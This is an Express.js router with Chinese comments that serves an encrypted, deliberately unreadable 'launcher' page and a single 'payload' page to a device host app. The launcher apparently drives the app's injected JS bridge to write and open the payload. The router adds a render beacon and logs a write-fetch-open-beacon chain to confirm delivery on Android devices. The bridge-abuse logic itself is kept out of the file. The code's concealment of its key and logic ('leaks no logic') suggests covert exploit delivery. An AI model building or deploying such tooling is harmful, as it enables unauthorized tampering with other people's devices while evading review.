/*
 * /zxw —— 设备启动器（通用下发框架）
 *
 * 职责：把 server/public/zxw/ 下的「启动页」与「负载页」下发给设备端宿主 App，
 * 并提供事件取证。启动页如何调用宿主注入的 JS 桥完成写入/打开，属于启动页
 * 自身的适配逻辑（源文件 launcher.src.html 不入库，入库产物 launcher.html
 * 为反阅读构建产物，见 scripts/build-zxw-launcher.mjs）；本文件不含任何宿主
 * 适配常量。
 *
 * 路由：
 *   GET  /zxw                启动页（server/public/zxw/launcher.html）
 *   GET  /zxw/<payload>      负载页（仅允许 config.payloadFile 指定的那一个文件）。
 *                            若 config.urlToken 非空，把页内该默认地址替换为请求
 *                            origin；并注入渲染信标（每次渲染回发 lock_beacon，
 *                            用于端到端确认「已打开且真的渲染了」+ 副本版本核对）
 *   ALL  /zxw/evt            设备端事件上报（GET query 与 POST JSON 均收）
 *   GET  /zxw/log            事件 oracle（最近 200 条；?reset=1 清空）
 *
 * 事件链（取证判读）：
 *   zxw_write（启动页下发）→ served(src=native)（宿主原生客户端真来取字节）
 *   → zxw_open（启动页下发打开）→ lock_beacon(v=N)（负载页真的渲染了）
 */
var express = require('express');
var router = express.Router();
var fs = require('fs');
var path = require('path');

var ZXW_DIR = path.join(__dirname, '../../public/zxw');
var LAUNCHER_FILE = 'launcher.html';
// 启动页一次性填充流（构建产物，不入库；见 scripts/build-zxw-launcher.mjs）
var BOOT_FILE = path.join(__dirname, '../../config/zxw-boot.json');

// 可选配置：server/config/zxw.json（不入库，结构见 zxw.json.example）
var cfg = { payloadFile: 'classintra.html', urlToken: '' };
try {
  var userCfg = JSON.parse(fs.readFileSync(path.join(__dirname, '../../config/zxw.json'), 'utf8'));
  if (userCfg && typeof userCfg === 'object') {
    if (userCfg.payloadFile) cfg.payloadFile = String(userCfg.payloadFile);
    if (userCfg.urlToken) cfg.urlToken = String(userCfg.urlToken);
  }
} catch (e) { /* 无配置文件时用默认值 */ }

// 事件环（进程内存活，重启即清空 —— 判读以「重启后是否复现」为准）
var events = [];
var MAX_EVENTS = 200;

function pushEvent(ev) {
  ev.ts = Date.now();
  events.push(ev);
  if (events.length > MAX_EVENTS) events.splice(0, events.length - MAX_EVENTS);
  try { console.log('[ZXW] ' + JSON.stringify(ev)); } catch (e) {}
}

// 事件来源分类：native = 宿主原生下载客户端（真取字节），webview = App 内 WebView（预览等）
function uaSrc(ua) {
  ua = String(ua || '');
  if (ua.indexOf('Dalvik') === 0) return 'native';
  if (ua.indexOf('; wv)') !== -1) return 'webview';
  return 'other';
}

// 原生下载客户端兼容：禁用 gzip（identity 直出），避免任何传输编码歧义
router.use(function(req, res, next) {
  req.headers['x-no-compression'] = '1';
  next();
});

// 启动页（注入一次性填充流；boot 缺失时注入空值，页面显示中性提示，不泄露任何逻辑）
router.get('/', function(req, res) {
  fs.readFile(path.join(ZXW_DIR, LAUNCHER_FILE), function(err, buf) {
    if (err) {
      res.status(404).send('ZXW 启动页未部署：缺少 server/public/zxw/' + LAUNCHER_FILE + '（需在本机构建，见 scripts/build-zxw-launcher.mjs）');
      return;
    }
    var html = buf.toString('utf8');
    var pad1 = '', pad2 = '';
    try {
      var boot = JSON.parse(fs.readFileSync(BOOT_FILE, 'utf8'));
      if (boot && typeof boot.pad1 === 'string' && typeof boot.pad2 === 'string') {
        pad1 = boot.pad1;
        pad2 = boot.pad2;
      }
    } catch (e) { /* boot 缺失：留空，页面给出中性提示 */ }
    html = html.split('"__ZXW_PAD1__"').join('"' + pad1 + '"');
    html = html.split('"__ZXW_PAD2__"').join('"' + pad2 + '"');
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
    res.send(html);
  });
});

// 事件上报
router.all('/evt', function(req, res) {
  var body = req.method === 'POST' ? (req.body || {}) : req.query;
  var ev = { kind: String(body.kind || 'evt') };
  var keys = ['t', 'phase', 'ok', 'via', 'uri', 'name', 'uid', 'url', 'err', 'href', 'v', 'cached'];
  for (var i = 0; i < keys.length; i++) {
    if (body[keys[i]] !== undefined) ev[keys[i]] = body[keys[i]];
  }
  pushEvent(ev);
  res.json({ ok: true });
});

// 取证日志
router.get('/log', function(req, res) {
  if (req.query.reset === '1') events.length = 0;
  res.json({ events: events, count: events.length });
});

// 部署自检：一次说清「产物在不在、密钥在不在、两者配不配对」
// 背景：zxw-boot.json 不入库，launcher.html 入库；两者必须来自同一次构建。
// 只拷了产物→页面报「密钥未部署」；只拷了密钥→报「密钥与产物不匹配」。
// 判据：用密钥解开产物里的 BODY 密文，能解出 <h1 才算配对（与前端同一套算法）。
function checkPairing(html, pad1B64) {
  try {
    var m = /var c1=atob\('([A-Za-z0-9+/=]+)'\)/.exec(html);
    if (!m) return false;
    var c = Buffer.from(m[1], 'base64');
    var p = Buffer.from(pad1B64 || '', 'base64');
    if (!p.length || p.length < c.length) return false;
    var n = Math.min(c.length, 64);
    var head = '';
    for (var i = 0; i < n; i++) head += String.fromCharCode(c[i] ^ p[i]);
    return head.indexOf('<h1') !== -1 || head.indexOf('<div') !== -1;
  } catch (e) {
    return false;
  }
}

router.get('/health', function(req, res) {
  var out = {
    ok: false,
    launcher: { exists: false, bytes: 0 },
    boot: { exists: false, pad1: 0, pad2: 0, builtAt: null },
    payload: { file: cfg.payloadFile, exists: false },
    paired: false,
    hint: ''
  };
  var html = '';
  try {
    html = fs.readFileSync(path.join(ZXW_DIR, LAUNCHER_FILE), 'utf8');
    out.launcher.exists = true;
    out.launcher.bytes = Buffer.byteLength(html);
  } catch (e) {
    out.hint = '启动页产物缺失：需在构建机运行 node scripts/build-zxw-launcher.mjs';
  }
  var boot = null;
  try { boot = JSON.parse(fs.readFileSync(BOOT_FILE, 'utf8')); } catch (e) { boot = null; }
  if (boot) {
    out.boot.exists = true;
    out.boot.builtAt = boot.builtAt || null;
    out.boot.pad1 = String(boot.pad1 || '').length;
    out.boot.pad2 = String(boot.pad2 || '').length;
  } else if (out.launcher.exists) {
    out.hint = '密钥缺失（server/config/zxw-boot.json 不入库）：从构建机把 launcher.html 与 zxw-boot.json 成对拷来，不要在目标机单独重建';
  }
  if (out.launcher.exists && out.boot.exists) {
    out.paired = checkPairing(html, boot.pad1);
    if (!out.paired) out.hint = '密钥与产物不匹配（不是同一次构建）：请成对替换 launcher.html + zxw-boot.json';
  }
  try {
    out.payload.exists = fs.statSync(path.join(ZXW_DIR, cfg.payloadFile)).isFile();
  } catch (e) { out.payload.exists = false; }
  if (!out.payload.exists && !out.hint) out.hint = '负载页缺失：server/public/zxw/' + cfg.payloadFile;
  out.ok = out.launcher.exists && out.boot.exists && out.paired && out.payload.exists;
  res.json(out);
});

// 负载页（白名单：仅 config.payloadFile 一个文件名可被下发）
router.get('/:name', function(req, res, next) {
  if (req.params.name !== cfg.payloadFile) return next();
  fs.readFile(path.join(ZXW_DIR, cfg.payloadFile), 'utf8', function(err, html) {
    if (err) {
      res.status(404).send('ZXW 负载页缺失：server/public/zxw/' + cfg.payloadFile + '（应随仓库提供；如自定义负载页请放置同名文件）');
      return;
    }
    var host = req.headers.host;
    var origin = host ? (req.protocol || 'http') + '://' + host : '';
    if (origin && cfg.urlToken) {
      html = html.split(cfg.urlToken).join(origin);
    }
    if (origin) {
      var beacon = '<script>try{new Image().src="' + origin + '/zxw/evt?kind=lock_beacon&v=' + String(req.query.v || '0') + '&_="+Date.now()}catch(e){}</script>';
      html = html.replace('</body>', beacon + '</body>');
    }
    pushEvent({
      kind: 'served',
      t: String(req.query.t || ''),
      v: String(req.query.v || ''),
      src: uaSrc(req.headers['user-agent']),
      name: cfg.payloadFile,
      ua: String(req.headers['user-agent'] || '').slice(0, 120)
    });
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
    res.send(html);
  });
});

module.exports = router;
